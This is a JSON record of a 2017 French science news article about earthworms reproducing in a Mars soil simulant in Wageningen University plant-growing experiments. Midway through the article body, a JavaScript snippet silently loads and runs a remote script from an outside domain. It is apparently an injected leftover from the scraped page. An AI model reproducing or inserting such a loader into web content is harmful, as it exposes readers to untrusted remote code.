{"title": "Les vers de terre pourraient prospérer dans le sol de Mars", "newspaper": "Futura Sciences", "author": "Marie-Céline Jacquier", "date_publi": "01/12/2017", "content": "Des chercheurs ont observé que des vers de terre pouvaient se reproduire dans un simulant de sol martien, c'est-à-dire un matériau qui mime le sol de la Planète rouge. C'est une bonne nouvelle pour ceux qui voudront cultiver un jour des plantes sur Mars et les consommer... Les  vers de terre  jouent un rôle important dans l' écosystème  agricole car ils recyclent la  matière  organique. Ils se développent sur les restes végétaux qu'ils mangent et mélangent au sol. Leurs excréments contiennent de la matière organique qui est dégradée par des  bactéries , libérant ainsi des  nutriments  pour les plantes, comme de l' azote . De plus, en creusant des galeries, les vers de  terre  aèrent le sol et améliorent sa structure. Par ailleurs, ils favorisent l'accès des plantes à l'eau et aux nutriments.  Des scientifiques de l'université de Wageningue (Pays-Bas) ont observé la croissance de roquettes sur un simulant de  sol martien  fourni par la Nasa auquel des vers de terre et du lisier avaient été ajoutés. Le simulant est un  matériau  terrestre qui mime les propriétés physico-chimiques du sol martien. Les  déchets  organiques des humains présents sur  Mars  pourraient servir un jour à fertiliser le sol, mais, pour leur expérience, les chercheurs ont préféré utiliser du lisier de porc. Le simulant a été comparé à un  sable  utilisé pour le jardinage.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Deux bébés vers de terre sont nés dans le simulant de sol martien Au départ, il n'y avait que des vers adultes dans le simulant. Mais, surprise : deux petits vers de terre sont apparus !  « Il est clair que le fumier a stimulé la croissance, en particulier dans le simulant du sol de Mars, et nous avons vu que les vers étaient actifs. Cependant, la meilleure surprise est venue à la fin de l'expérience, quand nous avons trouvé deux jeunes vers dans le simulant du sol de Mars  », a expliqué Wieger Wamelink dans un  communiqué de l’université .  Le biologiste ajoute que ces expériences visant à faire pousser des  plantes  ont commencé en 2013 et qu'une douzaine de cultures ont été réalisées avec succès :  haricots verts , pois,  radis ,  tomates ,  pommes de terre ,  carottes , cresson... Les plantes obtenues ont été analysées pour vérifier qu'elles étaient consommables. Pour fêter cela, les chercheurs ont invité les personnes ayant participé au financement ( crowdfunding ) de cette recherche à partager un repas avec ces plantes au menu. Le lombricompostage, recycler ses déchets grâce aux vers de terre                       Pour recycler facilement les déchets organiques, rien de mieux que le lombricompostage. Cette technique basée sur l'activité naturelle des vers de terre se développe de plus en plus du fait de ses avantages écologiques et économiques. FutureMag, l’émission d’Arte, est partie à la rencontre de deux makers qui vous expliquent en vidéo comment fabriquer votre premier composteur.                                       ", "theme": "sciences"}